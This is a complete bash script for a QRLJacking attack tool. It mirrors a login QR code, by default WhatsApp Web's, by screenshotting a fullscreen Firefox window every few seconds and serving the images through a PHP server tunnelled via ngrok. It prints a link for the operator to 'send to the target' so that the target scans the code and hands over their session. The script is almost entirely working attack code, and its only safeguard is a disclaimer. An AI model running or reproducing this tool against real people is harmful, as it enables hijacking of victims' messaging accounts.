trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v firefox > /dev/null 2>&1 || { echo >&2 "I require firefox but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
command -v scrot > /dev/null 2>&1 || { echo >&2 "I require scrot but it's not installed. Install it: sudo apt-get install scrot"; exit 1; }
command -v xdotool > /dev/null 2>&1 || { echo >&2 "I require xdotool but it's not installed. Install it: sudo apt-get install xdotool"; exit 1; }

}


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)

if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi

if [[ -e sendlink ]]; then
rm -rf sendlink
fi

if [[ -e tmp.jpg ]]; then
rm -rf tmp.jpg
fi

}

scrot_screen() {


firefox $website &
sleep 10
xdotool key "F11"
#sleep 3
while [ true ]; do
sleep 3
scrot -o -u tmp.jpg
done

}

banner() {
printf "\n"
printf "\e[1;93m             _____    ______                        \n"
printf '            ( ___ \  |_____ \                       \n'
printf "            | |  \ |  _____) )___   ___  ____   ___ \n"
printf "            | |  | | |  __  // _ \ / _ \|  _ \ /___)\n"
printf '            | |__| | | |  \ \ |_| | |_| | |_| |___ |\n'
printf "             \______)|_|   |_\___/ \___/|  __/(___/ \n"
printf '                                        |_|         \e[0m\n'

printf "\n"
printf "\e[1;77m                    .:.:\e[0m\e[1;93m QRLJacking tool \e[0m\e[1;77m:.:.\e[0m\n"                              
printf "\n"
printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n"

}


website() {

default_website="https://web.whatsapp.com"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website to mirror QR\e[0m\e[1;77m (default: Whatsapp)\e[0m\e[1;92m: \e[0m\en' website
website="${website:-${default_website}}"

}



ngrok_server() {


if [[ ! -e ngrok ]]; then
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o '64bit' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'64bit'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi


printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting php server on port 3333...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 5
}

send_link() {

if [[ $forward == true ]];then
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
else
link=$custom_ip":"$custom_port

printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting php server on port %s...\n" $custom_port
php -S $custom_ip:$custom_port > /dev/null 2>&1 &
sleep 2
fi

printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;77m Send this link to the target:\e[0m\e[1;91m %s\e[0m\n" $link
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[1;93m Now, Firefox will open in fullscreen mode (close it if its open)\n\e[0m"
printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[1;93m Send the link to target after that.\e[0m"
read -p $'\e[1;77m Ok?\e[0m' -n 1 -r
printf "\\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[1;93m After you get session, close this script with\e[0m\e[1;92m Ctrl + C. \e[0m"
read -p $'\e[1;77mOk?\e[0m' -n 1 -r
printf '\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting Firefox...\e[0m\e[1;77m (wait 10 secs to get fullscreen)\e[0m\n'
printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Use F11 to exit fullscreen mode\e[0m\n'
scrot_screen
}

start1() {
if [[ -e tmp.jpg ]]; then
rm -rf tmp.jpg
fi
printf "\n"
printf " \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok.io:\e[0m\n"
printf " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom LHOST/LPORT:\e[0m\n"

default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
forward=true
website
ngrok_server
#serverx
send_link
elif [[ $option_server == 2 || $option_server == 02 ]]; then
default_custom_ip=$(hostname -I)
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LHOST: \e[0m' custom_ip
custom_ip="${custom_ip:-${default_custom_ip}}"
default_custom_port="4444"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LPORT: \e[0m' custom_port
custom_port="${custom_port:-${default_custom_port}}"
website
send_link
#start
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}

banner
dependencies
start1

